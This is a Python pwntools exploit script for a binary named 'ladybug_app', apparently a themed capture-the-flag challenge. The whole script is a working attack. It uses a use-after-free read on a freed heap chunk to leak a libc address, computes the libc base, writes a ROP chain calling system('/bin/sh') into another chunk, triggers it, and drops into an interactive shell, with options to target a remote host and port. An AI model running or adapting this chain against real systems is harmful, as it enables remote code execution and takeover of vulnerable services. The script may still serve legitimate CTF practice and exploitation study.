#!/usr/bin/env python3
from pwn import *
import argparse
import os

DEFAULT_EXECUTABLE = "./ladybug_app" 
DEFAULT_LIBC_PATH = "./libc.so.6"

GDB_SCRIPT = """
break main
break ladybug_initiate_city_takeover
break ladybug_unleash_swarm
break ladybug_retreat_agent
break ladybug_gather_intel
continue
"""
context.log_level = 'info'
p = None
libc = None
PROMPT = b"Noopsy Land is ours! Your command, Overlord?: "

def send_cmd(cmd_str):
    log.debug(f"Sending Directive: {cmd_str}")
    p.sendline(cmd_str.encode())

def unleash_swarm_agent(index, size):
    send_cmd(f"unleash_swarm {index} {size}")
    response = p.recvline_startswith(b"AGENT_DEPLOYED:").strip().decode()
    addr_str = response.split("AGENT_DEPLOYED: ")[1]
    log.info(f"Unleashed agent {index} (strength {size}) at: {addr_str}")
    return int(addr_str, 16)

def corrupt_noopsy_systems(index, hex_data):
    hex_data_str = hex_data.hex() if isinstance(hex_data, bytes) else hex_data
    send_cmd(f"corrupt_systems {index} {hex_data_str}")
    response = p.recvline_startswith(b"INJECT_OK:").strip().decode()
    log.info(f"Corrupted systems via agent {index}: {response.split(': ',1)[1]}")

def gather_noopsy_intel(index):
    send_cmd(f"gather_intel {index}")
    response = p.recvline().strip().decode()
    log.debug(f"Raw Intel Response for agent {index}: '{response}'")

    if response.startswith("INTEL_DATA: "):
        hex_data_str = response.split("INTEL_DATA: ", 1)[1]
        log.info(f"Intel from agent {index} (DATA): '{hex_data_str if hex_data_str else 'EMPTY_HEX_PAYLOAD'}'")
        return bytes.fromhex(hex_data_str) if hex_data_str else b""
    elif response.startswith("INTEL_EMPTY:"):
        log.info(f"Intel from agent {index} (EMPTY): {response}")
        return b""
    elif response.startswith("ERROR:"):
        log.error(f"Gather Intel for agent {index} resulted in C-level error: {response}")
        raise Exception(f"Gather Intel C-Error: {response}")
    else:
        log.error(f"Gather Intel for agent {index} got unexpected response format: '{response}'")
        raise Exception(f"Gather Intel Error - Unexpected Format: {response}")


def retreat_ladybug_agent(index):
    send_cmd(f"retreat_agent {index}")
    response = p.recvline_startswith(b"RECALL_OK:").strip().decode()
    log.info(f"Retreated agent {index}: {response.split(': ',1)[1]}")

def initiate_city_takeover_protocol(rop_addr):
    send_cmd(f"initiate_city_takeover {hex(rop_addr)}")
    try:
        takeover_msg = p.recvline_contains(b"Takeover Protocol via", timeout=1.5).strip().decode()
        log.info(f"Takeover confirmation: {takeover_msg}")
    except EOFError:
        log.warning("Connection closed after takeover command. ROP likely started/crashed.")
    except PwnlibException: 
        log.warning("No immediate takeover confirmation message or timeout. Proceeding to interactive.")
    log.info(f"City Takeover Protocol initiated with ROP at {hex(rop_addr)}.")


def exploit():
    global p, libc
    parser = argparse.ArgumentParser(description="Exploit for Ladybug Overlord's control system.")
    parser.add_argument("--gdb", "-G", action="store_true", help="Run with GDB.")
    parser.add_argument("--host", "-H", type=str, help="Remote host.")
    parser.add_argument("--port", "-P", type=int, help="Remote port.")
    parser.add_argument("--libc", "-L", default=DEFAULT_LIBC_PATH)
    parser.add_argument("--exe", "-E", default=DEFAULT_EXECUTABLE)
    args = parser.parse_args()

    if os.path.exists(args.exe):
        context.binary = ELF(args.exe, checksec=False)
    elif not args.host:
        log.critical(f"Local executable '{args.exe}' not found.")
        return

    if args.host:
        if not args.port: parser.error("--port is required with --host.")
        p = remote(args.host, args.port)
    elif args.gdb:
        if not context.binary: log.critical("Executable context not set for GDB."); return
        p = gdb.debug(context.binary.path, gdbscript=GDB_SCRIPT)
    else:
        if not context.binary: log.critical("Executable context not set."); return
        p = process(context.binary.path)

    try:
        libc = ELF(args.libc, checksec=False)
    except FileNotFoundError:
        log.critical(f"Libc file '{args.libc}' not found!"); p.close(); return

    p.recvuntil(PROMPT) 
    log.success("Ladybug Command System ready.")

    log.info("Phase 1: Leaking Libc address...")
    agent0_size = 1072
    unleash_swarm_agent(0, agent0_size)
    p.recvuntil(PROMPT)

    unleash_swarm_agent(1, 32) 
    p.recvuntil(PROMPT)

    retreat_ladybug_agent(0)
    p.recvuntil(PROMPT)

    leaked_data = gather_noopsy_intel(0)
    p.recvuntil(PROMPT)

    if len(leaked_data) < 8:
        log.critical(f"Leak too short ({len(leaked_data)} bytes)."); p.close(); return
    leaked_fd_ptr = u64(leaked_data[:8])
    log.success(f"Leaked fd pointer: {hex(leaked_fd_ptr)}")

    LIBC_LEAK_OFFSET = 0x1d2cc0
    libc.address = leaked_fd_ptr - LIBC_LEAK_OFFSET
    log.success(f"Calculated Libc base: {hex(libc.address)}")
    if libc.address & 0xfff != 0: 
        log.warning(f"Calculated Libc base {hex(libc.address)} is not page-aligned. Offset {hex(LIBC_LEAK_OFFSET)} might be incorrect for this libc version.")

    log.info("Phase 2: Preparing ROP chain...")
    try:
        system_addr = libc.symbols['system']
        exit_addr = libc.symbols['exit']
        pop_rdi_ret_gadget = next(libc.search(asm("pop rdi; ret"), executable=True))
        ret_gadget = next(libc.search(asm("ret"), executable=True)) 
    except Exception as e:
        log.critical(f"Failed to find symbols/gadgets in libc: {e}"); p.close(); return

    log.info(f"  system @ {hex(system_addr)}")
    log.info(f"  pop rdi; ret @ {hex(pop_rdi_ret_gadget)}")

    rop_agent_idx = 2
    rop_agent_strength = 200
    rop_agent_deployment_addr = unleash_swarm_agent(rop_agent_idx, rop_agent_strength)
    p.recvuntil(PROMPT)

    bin_sh_str_addr = rop_agent_deployment_addr
    rop_chain_start_for_rsp = rop_agent_deployment_addr + 8

    payload = b"/bin/sh\x00"
    payload += p64(ret_gadget) 
    payload += p64(pop_rdi_ret_gadget)
    payload += p64(bin_sh_str_addr)
    payload += p64(system_addr)
    payload += p64(exit_addr) 
    if len(payload) > rop_agent_strength:
        log.error(f"Payload size {len(payload)} exceeds agent strength {rop_agent_strength}!"); p.close(); return

    corrupt_noopsy_systems(rop_agent_idx, payload)
    p.recvuntil(PROMPT)
    log.success("ROP chain payload injected.")

    log.info("Verifying ROP payload...")
    observed_data = gather_noopsy_intel(rop_agent_idx) 
    p.recvuntil(PROMPT)

    expected_start = payload[:len(observed_data)] 
    if observed_data != expected_start:
        log.error(f"VERIFICATION FAILED! Expected prefix: {expected_start.hex()}, Got: {observed_data.hex()}"); p.close(); return
    log.success("Payload verification successful.")

    log.info("Phase 3: Triggering ROP chain...")
    initiate_city_takeover_protocol(rop_chain_start_for_rsp)

    log.success("ROP chain executed. Attempting to interact...")
    p.interactive()

if __name__ == "__main__":
    exploit()